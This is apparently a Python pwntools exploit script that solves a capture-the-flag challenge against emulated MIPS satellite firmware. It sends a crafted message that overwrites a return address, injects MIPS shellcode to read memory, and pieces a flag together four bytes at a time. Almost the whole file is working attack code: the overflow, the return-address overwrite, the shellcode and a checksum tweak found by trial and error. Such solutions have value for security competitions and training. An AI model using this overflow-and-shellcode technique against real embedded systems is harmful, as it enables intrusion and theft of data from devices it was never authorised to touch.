#!/usr/bin/env python3

# The absurd number of sleeps here is because
# this vmips gets mad when you send data too fast
# because it doesn't want to do nested interrupts I think

from pwn import *
import time

rhost = 'elite-poet.satellitesabove.me'
rport = 5012
ticket = ''

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'
context.arch = 'mips'

r = remote(rhost, rport)
print(r.recv())
r.send(ticket + '\n')

#r = process(["./vmips_patched","-o","fpu","-o","memsize=3000000","firmware.rom"])
#r = gdb.debug(["./vmips_patched","-o","fpu","-o","memsize=3000000","firmware.rom"])

def is_valid_flag(f):
    if not f.isascii():
        return False
    for x in f:
        if x < 33:
            return False
    return True

flag = b""
r.recv()
#def encode_msg()
def main(off):
    global flag

    payload = """
    lui $v0, 0xa200
    lw $v0, %s($v0)
    lui $v1, 0xa300
    sw $v0, 0x0024($v1)
    lui $v0, 0xa300
    sb $zero, 0x20($v0)
    lui $v0, 0xbfc0
    or $v0, $v0, 0x4fd4
    j $v0
    """ % (hex(0x8000 + off))
    payload = asm(payload)

    data = r.recv()
    if data[:4].isascii() and is_valid_flag(data[:4]):
        flag += data[:4]
        print(flag)

    buf_addr = 0xa00fefcc
    jump_addr = 0xa00fefd8
    # handshake
    r.send(b"\xa5")
    r.send(b"\x5a")

    # message id / lower 4 bits of user data
    r.send(b"\x5c")

    # pad
    r.send(b"\xff")

    # return address
    r.send(p32(jump_addr))

    # garbage
    r.send(b"\xff")
    r.send(b"\xff")
    r.send(b"\xff")
    r.send(b"\xff")
    r.send(b"\xff")

    # more delayed garbage
    for _ in range(5):
        time.sleep(0.1)
        r.send(b"\x00")


    print(len(payload))
    print(payload.hex())

    # At this point we are at 0xa00fefdc
    # (there's some \x00 bytes before, which is NOP)
    # send our shellcode in two parts
    r.send(payload[:20])
    time.sleep(0.5)
    r.send(payload[20:])

    # Send enough bytes to fill up the remaining required (minus 1)
    for _ in range(45 - len(payload)):
        time.sleep(0.1)
        r.send(b"\x00")

    # This makes the checksum work (determined by trial-and-error / 'debugger')
    r.send(b"\x4e")

    # some of the messages will not have flag data, because
    # i didn't turn off the garbage print at regular intervals
    #
    # so we have to parse out only the valid-looking 4-byte chunks
    while True:
        part_flag = r.recv(16, timeout=0.5)[:4]
        if part_flag.isascii() and is_valid_flag(part_flag):
            print(part_flag)
            flag += part_flag
            print(flag)
            break

if __name__ == '__main__':
    for x in range(0, 128, 4):
        main(x)
    print(flag)
